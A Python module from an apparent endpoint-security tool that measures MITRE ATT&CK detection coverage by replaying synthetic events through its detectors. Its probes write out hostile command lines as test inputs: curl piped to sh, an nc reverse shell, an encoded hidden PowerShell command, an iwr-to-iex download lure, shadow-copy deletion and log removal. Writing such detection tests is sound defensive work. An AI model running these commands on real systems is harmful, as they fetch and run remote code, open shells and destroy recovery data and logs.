"""ATT&CK coverage, measured rather than claimed.

Endpoint products are measured covering roughly half of ATT&CK, and even that
figure is inflated by rules nobody would act on (USENIX Security 2024). A map
that lists which collector "covers" a technique says nothing about whether the
detection still fires. So each technique here gets one of four levels:

  validated   a probe fed a realistic event to the real detector and it fired,
              and a collector that feeds that detector is currently reporting.
              That proves one procedure of the technique is caught, not every
              way of doing it: `vssadmin delete shadows` fires, a ransomware
              that deletes shadow copies through COM does not
  claimed     a collector is mapped to the technique, but nothing proves it
  regressed   a probe that should fire did not — a detector broke silently
  blind       nothing here looks for it

Probes call the same functions the collectors call, with synthetic evidence;
they never execute a technique on the machine, so they cannot trip alerts or
leave artefacts. They validate the rule. Sensor liveness is judged separately
from each feeding collector's freshness, so a proven rule behind a dead
collector is reported as such, not as coverage.
"""

import json
import os
import tempfile
import time

from jarvis.core.finding import finding as _finding

META = "attack_coverage_v1"
TACTIC_ORDER = (
    "reconnaissance", "resource-development", "initial-access", "execution",
    "persistence", "privilege-escalation", "credential-access",
    "discovery", "lateral-movement", "collection", "command-and-control",
    # ATT&CK split defense-evasion into these two; older catalogues keep it.
    "stealth", "defense-impairment", "defense-evasion",
    "exfiltration", "impact",
)


# ── probes ──────────────────────────────────────────────────────────────────
# Each returns (fired, what it checked). Imports are local so one broken
# detector module fails its own probe instead of the whole map.

def _linux_rules(*events):
    from jarvis.collectors.telemetry import sysmon_linux
    return sysmon_linux._rules(list(events))


def _titles(findings, severities=("critical", "high", "medium")):
    return [f["title"] for f in findings if f.get("severity") in severities]


def probe_injection():
    from jarvis.collectors.telemetry import sysmon
    v = sysmon.thread_verdict(r"C:\Users\x\AppData\Local\Temp\a.exe", r"C:\Windows\explorer.exe",
                              "-", "-", "0x000001A2B3C40000")
    return bool(v and v[0] == "critical"), "remote thread starting in unbacked memory"


def probe_download_run():
    out = _linux_rules({"id": 1, "Image": "/usr/bin/bash", "ParentImage": "/usr/bin/sshd",
                        "CommandLine": "bash -c 'curl -s https://x.example/i.sh | sh'"})
    return "download-and-run in a command line" in _titles(out), "curl piped into sh"


def probe_log_removal():
    out = _linux_rules({"id": 26, "Image": "/usr/bin/rm", "TargetFilename": "/var/log/auth.log"})
    return "a log or history file was deleted" in _titles(out), "rm of /var/log/auth.log"


def probe_webshell_spawn():
    out = _linux_rules({"id": 1, "Image": "/usr/bin/sh", "ParentImage": "/usr/sbin/nginx",
                        "CommandLine": "sh -c id"})
    return any("spawned a shell" in t for t in _titles(out)), "nginx spawning sh"


def probe_service_persistence():
    out = _linux_rules({"id": 11, "Image": "/usr/bin/cp",
                        "TargetFilename": "/etc/systemd/system/update-helper.service"})
    return "write to a persistence or trust location" in _titles(out), "new systemd unit by cp"


def probe_reverse_shell():
    out = _linux_rules({"id": 1, "Image": "/usr/bin/nc", "ParentImage": "/usr/bin/bash",
                        "CommandLine": "nc 203.0.113.9 4444 -e /bin/sh"})
    return any("connect-back" in t for t in _titles(out)), "nc -e to a public address"


def probe_encoded_command():
    from jarvis.collectors.process import detect
    reasons = detect.traits({"host": "win", "name": "powershell.exe",
                             "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                             "cmdline": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="})
    return "encoded-command" in reasons, "powershell -enc"


def probe_masquerade():
    from jarvis.collectors.process import detect
    reasons = detect.traits({"host": "win", "name": "svchost.exe",
                             "exe": r"C:\Users\x\AppData\Local\Temp\update.exe", "cmdline": ""})
    return "name-mismatch" in reasons and "temp-exec" in reasons, "svchost.exe name on a temp binary"


def probe_private_key():
    # Only the openssh-key-v1 header with "none" cipher fields, repeated: no
    # key material. The armor is assembled at runtime so this source file is
    # not itself a key-shaped literal for the secrets collector to report.
    # The body is encoded at runtime too: a compiler that folds constants
    # (the native release build) would otherwise store a key-shaped string.
    import base64

    from jarvis.collectors.identity.secrets import patterns
    armor = "OPENSSH PRIVATE KEY"
    header = b"openssh-key-v1\0\0\0\0\4none\0\0\0\4none" * 3
    body = (f"-----BEGIN {armor}-----\n" + base64.b64encode(header).decode() +
            f"\n-----END {armor}-----\n")
    with tempfile.NamedTemporaryFile("w", suffix=".pem", delete=False) as fh:
        fh.write(body)
    try:
        hits = patterns.scan_file(fh.name)
    finally:
        os.unlink(fh.name)
    return bool(hits), "unencrypted private key block in a file"


def probe_c2_domain():
    from jarvis.core import warninglist
    from jarvis.core.store import Store
    with tempfile.TemporaryDirectory() as tmp:
        store = Store(os.path.join(tmp, "probe.db"))
        try:
            store.db.execute(
                """INSERT INTO indicators(kind,value,norm,confidence,topic,context,malware,
                                          source_url,first_seen,last_seen,source)
                   VALUES('domain','kx9-relay.top','kx9-relay.top','high','','c2','probe','',0,0,'threatfox')""")
            m = warninglist.match_domain(store, "api.kx9-relay.top")
        finally:
            store.close()
    return bool(m and m["severity"] == "critical"), "subdomain of a ThreatFox C2 domain"


def probe_hidden_process():
    from jarvis.collectors.process.hidden import run
    pid = os.getpid()
    return run.confirmed_ghosts([pid], set(), {pid}) == [pid], "live pid absent from /proc listing"


def probe_popular_domain_not_flagged():
    # The inverse probe: a false-positive regression is a detector failure too.
    from jarvis.core import warninglist
    from jarvis.core.store import Store
    with tempfile.TemporaryDirectory() as tmp:
        store = Store(os.path.join(tmp, "probe.db"))
        try:
            store.db.execute(
                """INSERT INTO indicators(kind,value,norm,confidence,topic,context,malware,
                                          source_url,first_seen,last_seen,source)
                   VALUES('domain','azure.com','azure.com','medium','','x','','',0,0,'exa')""")
            m = warninglist.match_domain(store, "onedscolprdneu53.northeurope.cloudapp.azure.com")
        finally:
            store.close()
    return m is None, "Windows telemetry host not matched by a writeup's azure.com"


# ── probes built from the technique rule table ──────────────────────────────
# collectors/telemetry/techniques.py carries, for every rule, a command line
# that must fire it. Each is replayed through the real detector entry point
# (sysmon.audit / sysmon_linux._rules), so the probe exercises the rule table,
# the event plumbing around it and the finding it produces - not a copy.

_WHEN = "2026-01-01T00:00:00.000Z"
_PARENT_GUID = "{11111111-1111-1111-1111-111111111111}"


def _replay(platform, pairs, parent=""):
    """Findings the real detector produces for these (image, command line) starts."""
    from jarvis.collectors.telemetry import sysmon, sysmon_linux, techniques
    if platform == techniques.WIN:
        return sysmon.audit(events=[
            {"id": 1, "image": image, "cmdline": cmd, "time": _WHEN,
             "parent": parent or r"C:\Windows\System32\cmd.exe", "parent_guid": _PARENT_GUID}
            for image, cmd in pairs])
    return sysmon_linux._rules([
        {"id": 1, "Image": image, "CommandLine": cmd, "ParentImage": parent or "/usr/bin/bash",
         "ParentProcessGuid": _PARENT_GUID} for image, cmd in pairs])


def _reports(findings, tid):
    return any(tid in (f.get("techniques") or ()) and f.get("severity") != "ok"
               for f in findings)


def _replay_registry(sample):
    from jarvis.collectors.telemetry import sysmon
    image, key, details = sample
    return sysmon.audit(events=[{"id": 13, "image": image, "reg_key": key,
                                 "reg_details": details, "time": _WHEN}])


def _technique_probe(tid):
    """Probe for one technique: every rule that reports it must fire, so the
    number of ways it is said to be caught (`techniques.ways`) is a tested one."""
    from jarvis.collectors.telemetry import techniques

    def probe():
        checked, fired = [], True
        for platform in (techniques.WIN, techniques.LINUX):
            rules = [r for r in techniques.RULES if tid in r.tids and r.platform == platform]
            # The strongest rule names the technique on this platform; all are replayed.
            rules.sort(key=lambda r: ("critical", "high", "medium", "low").index(r.severity))
            for rule in rules:
                fired &= _reports(_replay(platform, [rule.sample], rule.sample_parent), tid)
            if rules:
                checked.append(f"{platform}: {rules[0].title}"
                               + (f" and {len(rules) - 1} more" if len(rules) > 1 else ""))
            elif tid in techniques.DISCOVERY_SAMPLES[platform]:
                samples = techniques.DISCOVERY_SAMPLES[platform]
                others = [v for k, v in samples.items() if k != tid]
                burst = [samples[tid]] + others[:techniques.BURST_TECHNIQUES - 1]
                fired &= _reports(_replay(platform, burst), tid)
                # Alone it is ordinary, and must stay unreported.
                fired &= not _replay_reports_any(platform, [samples[tid]])
                checked.append(f"{platform}: counted in a discovery burst, silent alone")
        written = [r for r in techniques.REG_RULES if tid in r.tids]
        for rule in written:
            fired &= _reports(_replay_registry(rule.sample), tid)
        if written:
            checked.append(f"registry: {written[0].title}"
                           + (f" and {len(written) - 1} more" if len(written) > 1 else ""))
        return fired and bool(checked), "; ".join(checked)
    return probe


def _replay_reports_any(platform, pairs):
    return any(f.get("techniques") for f in _replay(platform, pairs))


def _technique_jobs(tid):
    from jarvis.collectors.telemetry import techniques
    platforms = {r.platform for r in techniques.RULES if tid in r.tids}
    if any(tid in r.tids for r in techniques.REG_RULES):
        platforms.add(techniques.WIN)
    platforms |= {p for p, samples in techniques.DISCOVERY_SAMPLES.items() if tid in samples}
    return tuple(job for platform, job in ((techniques.WIN, "sysmon"),
                                           (techniques.LINUX, "sysmon_linux"))
                 if platform in platforms)


def probe_lsass_read():
    from jarvis.collectors.telemetry import sysmon
    out = sysmon.audit(events=[{"id": 10, "image": r"C:\Users\x\AppData\Local\Temp\a.exe",
                                "target": r"C:\Windows\System32\lsass.exe",
                                "granted": "0x1010", "time": _WHEN}])
    opened = any(f["category"] == "credential access" and f["severity"] == "critical"
                 for f in out)
    rule, what = _technique_probe("T1003")()
    return opened and rule, "LSASS opened with PROCESS_VM_READ; " + what


def probe_recovery_tamper():
    out = _replay("win", [(r"C:\Windows\System32\vssadmin.exe",
                           "vssadmin delete shadows /all /quiet")])
    return any(f["category"] == "impact" and f["severity"] == "critical" for f in out), \
        "vssadmin delete shadows"


def probe_sideload():
    from jarvis.collectors.telemetry import sysmon
    out = sysmon.audit(events=[{"id": 7, "image": r"C:\Users\x\AppData\Local\App\app.exe",
                                "loaded": r"C:\Users\x\AppData\Local\App\version.dll",
                                "signed": "false", "time": _WHEN}])
    return any("side-loading" in f["title"] and f["severity"] == "high" for f in out), \
        "unsigned DLL loaded beside its host in a user-writable directory"


def probe_raw_device():
    out = _linux_rules({"id": 9, "Image": "/usr/bin/dd", "Device": "/dev/sda",
                        "ProcessId": "4242", "UtcTime": "2026-01-01 00:00:00.000"})
    return "raw device read" in _titles(out), "block device opened by dd"


def probe_boot_drift():
    from jarvis.collectors.host import bootintegrity
    base = {"firmware": "1.0", "option_roms": [], "boot_apps": ["a" * 64], "authorities": [],
            "variables": {"SecureBoot": "01", "PK": "p" * 16, "KEK": "k" * 16},
            "pcrs": {"0": "0" * 64, "7": "7" * 64}}
    now = dict(base, variables=dict(base["variables"], SecureBoot="00"),
               option_roms=["f" * 64], pcrs=dict(base["pcrs"], **{"0": "e" * 64}))
    out = bootintegrity.drift(base, now, "probe")
    titles = " | ".join(f["title"] for f in out if f["severity"] == "high")
    return ("Secure Boot variable SecureBoot changed" in titles and "option ROM" in titles), \
        "Secure Boot turned off, a new option ROM and changed firmware code measured before the OS"


def probe_reflective_image():
    from jarvis.collectors.process import assemblies
    row = {"verdict": "native", "name": "notepad.exe", "pid": 4242, "script": "", "unexplained": [],
           "sensitive": ["VirtualAllocEx", "WriteProcessMemory"], "offensive": [],
           "image": {"size": 262144, "exec": True, "private": True},
           "host": {"exe": r"C:\Windows\System32\notepad.exe", "launch": "explorer"}}
    out = assemblies.findings([row])
    return any(f["severity"] == "high" and "copied into this process" in f["detail"]
               for f in out), "executable PE image in private memory with no backing file"


def probe_pasted_command():
    from jarvis.collectors.host.intrusion import history
    lure = "powershell -w hidden -c \"iwr https://cdn-verify.example/c.txt | iex\""
    out = history._history_findings({"psHistory": [lure, "Get-ChildItem"], "psHistoryPath": "h"})
    # A vendor's own installer line has the same shape and must stay low.
    vendor = history._history_findings(
        {"psHistory": ["irm https://astral.sh/uv/install.ps1 | iex"], "psHistoryPath": "h"})
    return (any(f["severity"] == "high" and f["category"] == "clickfix" for f in out)
            and all(f["severity"] in ("low", "ok") for f in vendor)), \
        "download-and-run lure pasted into PowerShell; a vendor installer line stays low"


def probe_keyboard_hook():
    from jarvis.collectors.host.inputwatch import watchers
    row = {"kind": "hook", "type": 13, "pid": 4242, "start": "1", "first": 1767225600,
           "path": r"C:\Users\x\AppData\Roaming\svc\helper.exe", "sig": "NotSigned",
           "visible_windows": 0}
    signed = dict(row, path=r"C:\Program Files\Vendor\ptt.exe", sig="Valid", signer="Vendor")
    out = watchers.audit(result=({"watchers": [row, signed]}, ""), clock=1767225700)
    high = [f for f in out if f["severity"] == "high"]
    return (len(high) == 1 and "watching every keyboard event" in high[0]["title"]), \
        "unsigned process with a low-level keyboard hook; a signed one stays low"


def probe_attack_pipe():
    from jarvis.collectors.telemetry import sysmon
    out = sysmon.audit(events=[{"id": 17, "image": r"C:\Windows\PAExec-1234-HOST.exe",
                                "pipe": r"\PAExec-1234-HOST", "time": "2026-10-23T00:00:00Z"}])
    hit = [f for f in out if f["severity"] == "high" and "named pipe" in f["title"]]
    return bool(hit and "T1559" in hit[0].get("techniques", [])), \
        "named pipe of a known remote-execution tool reported high"


def probe_wmi_subscription():
    from jarvis.collectors.telemetry import sysmon
    out = sysmon.audit(events=[{"id": 20, "image": r"C:\Windows\System32\wbem\WmiPrvSE.exe",
                                "wmi_operation": "Created", "wmi_name": "Updater",
                                "wmi_type": "Command Line", "wmi_consumer": "Updater",
                                "wmi_destination": r"powershell -w hidden -f C:\Users\Public\u.ps1",
                                "wmi_user": "DOMAIN\\user", "time": "2026-10-23T00:00:00Z"}])
    hit = [f for f in out if f["severity"] == "critical" and "WMI event consumer" in f["title"]]
    return bool(hit), "a created WMI event consumer reported critical"


def _network_events(change):
    """Events netwatch records when one field of a steady connection changes."""
    import importlib

    from jarvis.core.store import Store
    # The package re-exports the function under the module's own name.
    record = importlib.import_module("jarvis.collectors.network.netwatch.record")
    base = {"ts": 1767225600, "iface": "Wi-Fi", "state": "connected", "ssid": "home",
            "bssid": "aa:aa:aa:aa:aa:01", "channel": "6", "band": "5 GHz",
            "auth": "WPA3-Personal", "cipher": "CCMP", "signal": 80, "ipv4": "192.0.2.10",
            "gateway": "192.0.2.1", "gw_mac": "aa:aa:aa:aa:aa:fe", "dns": "192.0.2.1"}
    with tempfile.TemporaryDirectory() as tmp:
        store = Store(os.path.join(tmp, "probe.db"))
        try:
            record.record(store, dict(base))
            steady = record.record(store, dict(base, ts=base["ts"] + 300))
            events = record.record(store, dict(base, ts=base["ts"] + 600, **change))
        finally:
            store.close()
    return {e["kind"]: e["severity"] for e in events}, steady


def probe_gateway_spoof():
    events, steady = _network_events({"gw_mac": "de:ad:be:ef:00:01", "dns": "203.0.113.53"})
    return (events.get("gateway-changed") == "high" and events.get("dns-changed") == "high"
            and not steady), \
        "default gateway answering from a new MAC and a changed resolver; no event while steady"


def probe_crypto_downgrade():
    events, steady = _network_events({"auth": "Open"})
    return events.get("crypto-downgrade") == "critical" and not steady, \
        "Wi-Fi encryption on the same network weakened from WPA3 to open"


def probe_login_guessing():
    from jarvis.collectors.identity import bruteforce
    guess = [f"sshd[9]: Failed password for invalid user u{i} from 203.0.113.9 port 4{i:04d} ssh2"
             for i in range(bruteforce.SPIKE_ONE_SOURCE)]
    out = bruteforce._linux(lines=guess)
    quiet = bruteforce._linux(lines=guess[:3])
    return (any(f["severity"] == "high" for f in out)
            and all(f["severity"] == "ok" for f in quiet)), \
        "a failed-login spike from one source; three failures stay quiet"


def _remote_logon(logon):
    from jarvis.collectors.network import firewall
    out = firewall.audit_windows(data={"profiles": [], "secReadable": True, "logons": [logon]})
    return [f for f in out if f["category"] == "access" and "logon succeeded" in f["title"]]


def probe_remote_logon():
    hit = _remote_logon({"type": "3", "user": "alice", "ip": "203.0.113.9", "time": _WHEN})
    return (bool(hit) and hit[0]["severity"] in ("high", "critical")
            and not _remote_logon_none()), \
        "successful network logon with a real account from another machine; none, no finding"


def probe_external_rdp():
    hit = _remote_logon({"type": "10", "user": "alice", "ip": "203.0.113.9", "time": _WHEN})
    return (bool(hit) and "RDP" in hit[0]["title"]
            and hit[0]["severity"] in ("high", "critical")), \
        "successful RDP logon from another machine"


def _remote_logon_none():
    from jarvis.collectors.network import firewall
    out = firewall.audit_windows(data={"profiles": [], "secReadable": True, "logons": []})
    return [f for f in out if "logon succeeded" in f["title"]]


def probe_rogue_pam_module():
    from jarvis.collectors.persistence import implant
    with tempfile.TemporaryDirectory() as tmp:
        open(os.path.join(tmp, "pam_audit_helper.so"), "wb").close()
        open(os.path.join(tmp, "README"), "wb").close()
        out = implant.unowned_pam_modules(dirs=(tmp,))
    return (len(out) == 1 and out[0]["severity"] == "critical"
            and "pam_audit_helper.so" in out[0]["title"]), \
        "an authentication module that no installed package owns"


def probe_forced_authentication():
    from jarvis.collectors.telemetry import sysmon
    def smb(dest, initiated=True):
        return sysmon.audit(events=[{"id": 3, "image": r"C:\Windows\explorer.exe", "dest": dest,
                                     "dport": "445", "initiated": initiated, "time": _WHEN}])
    return (_reports(smb("8.8.4.4"), "T1187") and not _reports(smb("192.168.1.20"), "T1187")
            and not _reports(smb("8.8.4.4", initiated=False), "T1187")), \
        "outbound file-share connection to a public address; a LAN share and an inbound one are quiet"


def probe_unusual_port():
    from jarvis.collectors.telemetry import sysmon
    def conn(image, dest, port, initiated=True):
        return sysmon.audit(events=[{"id": 3, "image": image, "dest": dest, "dport": port,
                                     "initiated": initiated, "time": _WHEN}])
    ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    return (_reports(conn(ps, "8.8.4.4", "4444"), "T1571")
            and not _reports(conn(ps, "8.8.4.4", "443"), "T1571")
            and not _reports(conn(ps, "192.168.1.20", "4444"), "T1571")
            and not _reports(conn(ps, "8.8.4.4", "4444", initiated=False), "T1571")
            and not _reports(conn(r"C:\Program Files\App\app.exe", "8.8.4.4", "4444"), "T1571")), \
        ("a script host connecting out to a public address on an unusual port; a web port, a LAN "
         "address, an inbound connection and an ordinary program are quiet")


_DRIVES = {"C": ("Fixed", "NVMe"), "D": ("Fixed", "SATA"), "E": ("Removable", "USB"),
           "F": ("Fixed", "USB"), "Z": ("Network", "")}


def _drive_events(*pairs, volumes=_DRIVES):
    from jarvis.collectors.telemetry import sysmon
    return sysmon.audit(volumes=volumes, events=[
        {"id": 1, "image": image, "cmdline": cmdline, "time": _WHEN} for image, cmdline in pairs])


def probe_removable_run():
    def run(image, **kw):
        return _reports(_drive_events((image, image), **kw), "T1091")
    return (run(r"E:\tools\setup.exe") and run(r"F:\portable\app.exe") and run(r"G:\autorun.exe")
            and not run(r"C:\Program Files\App\app.exe") and not run(r"D:\Games\game.exe")
            and not run(r"Z:\share\tool.exe") and not run(r"E:\tools\setup.exe", volumes=None)), \
        ("a program started from a removable drive, a USB disk, or a drive detached before it "
         "could be asked about; internal disks and a network drive are quiet")


def _probe_copy(tid, fires, quiet):
    robocopy = r"C:\Windows\System32\Robocopy.exe"
    return (all(_reports(_drive_events((robocopy, c)), tid) for c in fires)
            and not any(_reports(_drive_events((robocopy, c)), tid) for c in quiet))


def probe_removable_read():
    return _probe_copy("T1025", (r"robocopy E:\ C:\Users\a\in /E",),
                       (r"robocopy C:\Users\a\Documents E:\backup /E",
                        r"robocopy D:\data C:\Users\a\in /E")), \
        "a copy command reading from a removable drive; a copy to one, or between internal disks, is quiet"


def probe_removable_write():
    return _probe_copy("T1052", (r"robocopy C:\Users\a\Documents E:\backup /E",),
                       (r"robocopy E:\ C:\Users\a\in /E",
                        r"robocopy C:\Users\a\Documents D:\backup /E")), \
        "a copy command writing to a removable drive; a copy from one, or between internal disks, is quiet"


def probe_raw_socket():
    import importlib
    sniffing = importlib.import_module("jarvis.collectors.network.sniffing")
    # The identity check reads /proc, so the probe states it: an expected daemon
    # verified by its image, anything else not (tests/test_sniffing_identity.py).
    def ident(pid, name):
        return "verified" if name in sniffing.PACKET_DAEMONS else "unexpected"
    held = sniffing._linux(tools=[], sockets=[("4242", "kworker")], promisc=[], identity=ident)
    usual = sniffing._linux(tools=[], sockets=[("77", "systemd-networkd")], promisc=[], identity=ident)
    return (any("raw packet socket" in f["title"] and f["severity"] == "high" for f in held)
            and all(f["severity"] == "ok" for f in usual)), \
        "an unexpected process holding a raw packet socket; the network daemons that need one are quiet"


def probe_generated_domains():
    from jarvis.collectors.telemetry import sysmon, techniques
    def lookups(n, status):
        return sysmon.audit(events=[
            {"id": 22, "image": r"C:\Users\x\AppData\Local\Temp\a.exe", "process_guid": "{9}",
             "query": f"q{i:02d}xkzvw{i * 7919 % 97}.example", "dns_status": status, "time": _WHEN}
            for i in range(n)])
    return (_reports(lookups(techniques.DGA_NAMES, techniques.NXDOMAIN), "T1568")
            and not _reports(lookups(techniques.DGA_NAMES - 1, techniques.NXDOMAIN), "T1568")
            and not _reports(lookups(techniques.DGA_NAMES * 2, "9701"), "T1568")), \
        "one process resolving many non-existent names; fewer, or names that merely lack a record, are quiet"


def _evasion(**payload):
    from jarvis.collectors.process import evasion
    return evasion.audit(data={"drivers": [], "dns": [], **payload})


def probe_vulnerable_driver():
    out = _evasion(drivers=[{"name": "RTCore64", "start": "demand",
                             "path": r"C:\Users\x\AppData\Local\Temp\RTCore64.sys"}])
    loaded = any(f["category"] == "byovd" and f["severity"] in ("critical", "high")
                 and "driver" in f["title"] for f in out)
    clean = _evasion(drivers=[{"name": "disk", "start": "boot",
                               "path": r"C:\Windows\System32\drivers\disk.sys"}])
    quiet = not any(f["category"] == "byovd" and f["severity"] in ("critical", "high")
                    and "driver" in f["title"] and "blocklist" not in f["title"] for f in clean)
    rule, what = _technique_probe("T1068")()
    return loaded and quiet and rule, ("exploitable or staged kernel driver loaded; " + what
                                       + " (the after-effect is seen, not the exploit)")


def probe_dead_drop():
    out = _evasion(dns=["api.telegram.org", "www.example.org"])
    hits = [f for f in out if f["category"] == "c2" and f["severity"] == "high"]
    clean = [f for f in _evasion(dns=["www.example.org"]) if f["category"] == "c2"]
    return (len(hits) == 1 and "api.telegram.org" in hits[0]["detail"]
            and all(f["severity"] == "ok" for f in clean)), \
        "a chat-bot or paste service used as a command channel was resolved"


def probe_browser_debugging():
    from jarvis.collectors.network import internetwatch
    app = {"pid": 4242, "name": "chrome.exe", "exe": r"C:\Program Files\Google\Chrome\chrome.exe"}
    def flags(found):
        out, _rows = internetwatch.analyze("win", {"apps": [dict(app, flags=found)],
                                                   "connections": []}, None)
        return [f for f in out if "security bypass flag" in f.get("title", "")]
    return len(flags(["--remote-debugging-port"])) == 1 and not flags([]), \
        "browser started with a remote-debugging port, which lets another program drive its sessions"


def probe_registry_redirect():
    from jarvis.collectors.host.toolchain import packaging
    with tempfile.TemporaryDirectory() as home:
        clean = packaging.registry_redirects(home=home)
        with open(os.path.join(home, ".npmrc"), "w") as fh:
            fh.write("registry=https://registry.npmjs.org/\n")
        default = packaging.registry_redirects(home=home)
        with open(os.path.join(home, ".npmrc"), "w") as fh:
            fh.write("registry=https://npm.mirror.example/\n")
        out = packaging.registry_redirects(home=home)
    return (len(out) == 1 and out[0]["severity"] == "high" and not clean and not default), \
        "package installs redirected to a non-default registry; the default one is quiet"


def probe_hardware_addition():
    from jarvis.collectors.host import bootintegrity
    base = {"firmware": "1.0", "option_roms": ["a" * 64], "boot_apps": [], "authorities": [],
            "variables": {}, "pcrs": {"2": "2" * 64}}
    same = bootintegrity.drift(base, dict(base), "probe")
    added = bootintegrity.drift(base, dict(base, option_roms=["a" * 64, "b" * 64],
                                           pcrs={"2": "9" * 64}), "probe")
    return (not same and any("option ROM" in f["title"] and f["severity"] == "high"
                             for f in added)), \
        "code from a newly attached card or device ran before the operating system"


def probe_injected_input():
    import importlib

    from jarvis.core.store import Store
    analysis = importlib.import_module("jarvis.collectors.host.inputwatch.analysis")
    with tempfile.TemporaryDirectory() as tmp:
        store = Store(os.path.join(tmp, "probe.db"))
        try:
            none = analysis.injected_findings(store, 0)
            store.db.execute("INSERT INTO input_events(ts, kind, lower_il, class, fg) "
                             "VALUES(1767225600, 'key', 1, 'key', 'notepad.exe')")
            store.commit()
            out = analysis.injected_findings(store, 0)
        finally:
            store.close()
    return (not none and len(out) == 1 and out[0]["severity"] == "critical"
            and "injected" in out[0]["title"]), \
        "a keystroke no hardware produced, injected from a lower integrity level; nothing stored, no finding"


def probe_firmware_change():
    from jarvis.collectors.host import bootintegrity
    base = {"firmware": "1.0", "option_roms": [], "boot_apps": [], "authorities": [],
            "variables": {}, "pcrs": {"0": "0" * 64}}
    same = bootintegrity.drift(base, dict(base), "probe")
    changed = bootintegrity.drift(base, dict(base, pcrs={"0": "f" * 64}), "probe")
    updated = bootintegrity.drift(base, dict(base, firmware="1.1", pcrs={"0": "f" * 64}), "probe")
    return (not same and any("firmware code measured differently" in f["title"]
                             and f["severity"] == "high" for f in changed)
            and all(f["severity"] != "high" for f in updated)), \
        ("firmware code measured differently with no version change (the effect is seen, not the "
         "write); a version change with it is graded lower")


def probe_technique_lookalikes():
    """No benign look-alike in the rule table may fire through the detectors."""
    from jarvis.collectors.telemetry import techniques
    wrong = [rule.title for rule in techniques.RULES for pair in rule.benign
             if any(set(rule.tids) & set(f.get("techniques") or ())
                    for f in _replay(rule.platform, [pair]))]
    # As for process rules: the look-alike must not be reported as the rule's own technique.
    # A different detector (the registry family watch judges the writer, not the value) may
    # still have something to say about the same write.
    wrong += [rule.title for rule in techniques.REG_RULES for sample in rule.benign
              if any(set(rule.tids) & set(f.get("techniques") or ()) for f in _replay_registry(sample))]
    total = sum(len(r.benign) for r in techniques.RULES + techniques.REG_RULES)
    return not wrong, (f"{total} benign look-alikes"
                       + (f"; fired: {', '.join(sorted(set(wrong))[:4])}" if wrong else ""))


def _table_probes():
    from jarvis.collectors.telemetry import techniques
    return {tid: (_technique_probe(tid), _technique_jobs(tid))
            for tid in sorted(techniques.technique_ids())}


# tid -> (probe, feeding collector jobs)
PROBES = {
    "T1055": (probe_injection, ("sysmon", "memscan")),
    "T1559": (probe_attack_pipe, ("sysmon",)),
    # T1546 (WMI subscriptions) stays claimed: the detector's field names come
    # from the Sysmon schema and no WMI event has been recorded on this host
    # yet, so a replay of a real record is required before it counts.
    "T1105": (probe_download_run, ("sysmon_linux",)),
    "T1070": (probe_log_removal, ("sysmon_linux",)),
    "T1505": (probe_webshell_spawn, ("sysmon_linux", "webshell")),
    "T1543": (probe_service_persistence, ("sysmon_linux", "control")),
    "T1059": (probe_encoded_command, ("scan",)),
    "T1036": (probe_masquerade, ("scan",)),
    "T1552": (probe_private_key, ("secrets",)),
    "T1071": (probe_c2_domain, ("sysmon", "hunt")),
    "T1014": (probe_hidden_process, ("hidden", "deep_hidden")),
    "T1219": (probe_reverse_shell, ("sysmon_linux",)),
    "T1003": (probe_lsass_read, ("sysmon",)),
    "T1490": (probe_recovery_tamper, ("sysmon",)),
    "T1574": (probe_sideload, ("sysmon",)),
    "T1006": (probe_raw_device, ("sysmon_linux",)),
    "T1542": (probe_boot_drift, ("preos",)),
}
# A probe exists only where its detector does: a release without the in-memory
# image classifier has nothing to prove, and the technique keeps its mapped
# (claimed) level instead of reading as a regression.
def _optional(tid, probe, jobs, ready):
    """Register a probe only when `ready()` says its detector can run here."""
    try:
        if ready():
            PROBES[tid] = (probe, jobs)
    except Exception:
        pass


def _params(module, function):
    import importlib
    import inspect
    return inspect.signature(getattr(importlib.import_module(module), function)).parameters


def _has(module, name=None):
    import importlib
    found = importlib.import_module(module)
    return name is None or hasattr(found, name)


_optional("T1620", probe_reflective_image, ("memscan",),
          lambda: _has("jarvis.collectors.process.assemblies"))
_optional("T1204", probe_pasted_command, ("intrusion",),
          lambda: _has("jarvis.collectors.host.intrusion.history", "_history_findings"))
_optional("T1056", probe_keyboard_hook, ("input",),
          lambda: _has("jarvis.collectors.host.inputwatch.watchers", "audit"))
_optional("T1557", probe_gateway_spoof, ("netwatch",),
          lambda: _has("jarvis.collectors.network.netwatch.record", "record"))
_optional("T1689", probe_crypto_downgrade, ("netwatch",),
          lambda: _has("jarvis.collectors.network.netwatch.record", "record"))
# The seams these three need (`lines=`, `data=`, `dirs=`) arrived with the
# probes; an older collector without them has nothing a probe can call.
_optional("T1110", probe_login_guessing, ("bruteforce",),
          lambda: "lines" in _params("jarvis.collectors.identity.bruteforce", "_linux"))
_optional("T1078", probe_remote_logon, ("firewall",),
          lambda: "data" in _params("jarvis.collectors.network.firewall", "audit_windows"))
_optional("T1133", probe_external_rdp, ("firewall",),
          lambda: "data" in _params("jarvis.collectors.network.firewall", "audit_windows"))
_optional("T1674", probe_injected_input, ("input",),
          lambda: _has("jarvis.collectors.host.inputwatch.analysis", "injected_findings"))
_optional("T1495", probe_firmware_change, ("preos",),
          lambda: _has("jarvis.collectors.host.bootintegrity", "drift"))
_optional("T1571", probe_unusual_port, ("sysmon",),
          lambda: _has("jarvis.collectors.telemetry.techniques", "odd_port"))
for _tid, _probe in (("T1091", probe_removable_run), ("T1025", probe_removable_read),
                     ("T1052", probe_removable_write)):
    _optional(_tid, _probe, ("sysmon",),
              lambda: _has("jarvis.collectors.telemetry.techniques", "off_disk")
              and "volumes" in _params("jarvis.collectors.telemetry.sysmon", "audit"))
_optional("T1205", probe_raw_socket, ("sniffing",),
          lambda: "tools" in _params("jarvis.collectors.network.sniffing", "_linux"))
_optional("T1187", probe_forced_authentication, ("sysmon",),
          lambda: _has("jarvis.collectors.telemetry.techniques", "outbound_smb"))
_optional("T1568", probe_generated_domains, ("sysmon",),
          lambda: _has("jarvis.collectors.telemetry.techniques", "dga_bursts"))
_optional("T1068", probe_vulnerable_driver, ("evasion", "sysmon"),
          lambda: "data" in _params("jarvis.collectors.process.evasion", "audit"))
_optional("T1102", probe_dead_drop, ("evasion",),
          lambda: "data" in _params("jarvis.collectors.process.evasion", "audit"))
_optional("T1185", probe_browser_debugging, ("internet",),
          lambda: _has("jarvis.collectors.network.internetwatch", "analyze"))
